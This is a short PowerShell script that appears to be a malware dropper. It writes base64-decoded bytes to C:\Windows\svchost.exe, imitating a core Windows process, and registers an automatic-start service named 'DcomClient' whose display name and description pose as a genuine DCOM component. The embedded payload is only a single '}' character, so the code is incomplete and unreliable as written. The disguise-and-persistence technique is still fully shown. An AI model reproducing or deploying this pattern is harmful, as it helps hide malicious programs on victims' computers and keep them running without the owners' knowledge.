$serviceName = "DcomClient"
$filePa='C:\Windows\svchost.exe'
if (-not (Test-Path -Path $filePa)){
	$bytes = [System.Convert]::FromBase64String('}')
	[System.IO.File]::WriteAllBytes($filePa, $bytes)
}
if (-not (Get-Service -Name $serviceName -ErrorAction SilentlyContinue)) {
	Write-Host "Service '$serviceName' not found. Creating..."
	New-Service -Name $serviceName -BinaryPathName $filePa -DisplayName "DCOM Client Process Launcher" -Description "The DCOMCLIENT service for interact with DCOM and COM service. It is strongly recommended that you have the DCOMCLIENT service running." -StartupType Automatic
	Write-Host "Service '$serviceName' created successfully."
} else {
	Write-Host "Service '$serviceName' already exists."
}
